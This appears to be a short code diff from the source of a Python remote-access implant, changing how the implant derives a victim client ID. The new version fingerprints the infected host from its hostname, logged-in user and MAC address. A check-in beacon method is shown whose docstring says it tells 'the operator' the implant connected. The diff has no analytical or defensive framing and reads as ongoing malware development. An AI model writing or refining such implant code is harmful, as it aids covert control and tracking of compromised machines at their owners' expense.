@@ -58,15 +58,13 @@ class Implant:
         self.processed_seqs = set()
 
     def _get_client_id(self) -> str:
-        """Generate a client ID from Adler32 hash of primary IP."""
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.connect(("8.8.8.8", 80))
-            ip = s.getsockname()[0]
-            s.close()
-        except Exception:
-            ip = "127.0.0.1"
-        return format(zlib.adler32(ip.encode()) & 0xFFFFFFFF, '08x')
+        """Generate a stable client ID from hostname+user+MAC."""
+        import uuid
+        hostname = socket.gethostname()
+        user = os.getlogin() if hasattr(os, 'getlogin') else 'unknown'
+        mac = format(uuid.getnode(), '012x')
+        seed = f"{hostname}|{user}|{mac}"
+        return format(zlib.adler32(seed.encode()) & 0xFFFFFFFF, '08x')
 
     def _send_checkin(self):
         """Send a check-in beacon so the operator knows we connected."""
